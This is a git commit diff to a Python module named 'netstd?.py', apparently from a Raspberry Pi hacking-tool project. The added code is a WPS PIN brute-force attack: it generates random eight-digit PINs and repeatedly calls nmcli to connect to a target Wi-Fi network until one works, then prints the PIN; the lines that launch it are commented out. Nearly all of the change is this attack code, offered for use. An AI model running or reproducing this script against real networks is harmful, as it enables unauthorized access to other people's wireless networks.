f90408b8e7162ed7e5b50319610820ed09cb8f7d
rickyfili10 <riccardofilieri@protonmail.com>
2025-01-07 18:46:36 +0100

    Update netstd?.py

--- src/libs/netstd?.py
+++ src/libs/netstd?.py
@@ -3,7 +3,47 @@ import RPi.GPIO as GPIO
 import os
 import subprocess
 import time
+import random
+import subprocess
+import time
 
+def generate():
+    pin = random.randint(10000000, 99999999)
+    return str(pin)
+
+def connect(ssid, pin):
+  
+    try:
+      
+        result = subprocess.run(
+            ["nmcli", "dev", "wifi", "connect", ssid, "--wps-pin", pin],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+
+        if "successfully activated" in result.stdout.lower():
+            ui_print(f"Connected '{ssid}'\npin {pin}")
+            return True
+        else:
+            return False
+    except Exception as e:
+        print(f"Error {pin}: {e}")
+        return False
+
+def brute_force_wps(ssid):
+    while True:
+        pin = generate()
+        if connect(ssid, pin):
+            ui_print(f"PIN: {pin}")
+            break
+
+        time.sleep(1)
+
+
+# network_ssid = getinput() 
+# brute_force_wps(network_ssid)
+ 
 
 bk_ = 0
 
